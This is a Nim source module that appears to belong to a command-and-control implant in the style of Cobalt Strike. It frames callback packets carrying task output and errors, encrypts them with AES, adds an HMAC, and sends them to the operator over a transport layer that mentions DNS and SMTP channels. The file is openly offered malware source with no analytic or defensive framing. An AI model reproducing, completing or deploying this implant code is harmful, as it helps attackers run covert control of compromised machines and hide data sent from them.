import std/[endians, locks]
import ../[crypt, utils, config]
import ../transport/protocol
import ./types

var packet_counter = 0
var pakcetLock: Lock
initLock pakcetLock

proc make_packet(cb: callback_type, data: seq[byte]): seq[byte] =
    var buf: seq[byte]
    
    packet_counter += 1
    var temp4: array[4, byte]
    bigEndian32(addr temp4, addr packet_counter)
    buf.add(temp4)

    if data.len != 0:
        var total_len = data.len + 4
        bigEndian32(addr temp4, addr total_len)
        buf.add(temp4)
    
    bigEndian32(addr temp4, addr cb)
    buf.add(temp4)

    buf.add(data)

    # encrypt and hash, TODO DNS
    var encrypted = aes_encrypt(buf)
    when config.protocol != "dns://" and config.protocol!= "smtp://":
        var total_len = encrypted.len + 16
        bigEndian32(addr temp4, addr total_len)
        result.add(temp4)
    result.add(encrypted)
    result.add(hmac_hash(encrypted))

proc push_result*(cb: callback_type, data: seq[byte]) =
    # todo encode CALLBACK_OUTPUT to utf8
    # if cb == CALLBACK_OUTPUT:
    #     var utf8bytes = codepage_to_utf8_native(data)
    #     if utf8bytes.len != 0: data = utf8bytes

    withLock pakcetLock:
        var packet = make_packet(cb, data)
        discard send_request(packet, output = true)

proc push_error*(err: string) =
    dbg "[-] error: " & err

    var packet: seq[byte]
    var temp4: array[4, byte]
    var err_id, arg1, arg2 = 0.int32
    bigEndian32(addr temp4, addr err_id)
    packet.add(temp4)
    bigEndian32(addr temp4, addr arg1)
    packet.add(temp4)
    bigEndian32(addr temp4, addr arg2)
    packet.add(temp4)
    packet.add(err.toSeq)
    push_result(CALLBACK_ERROR, packet)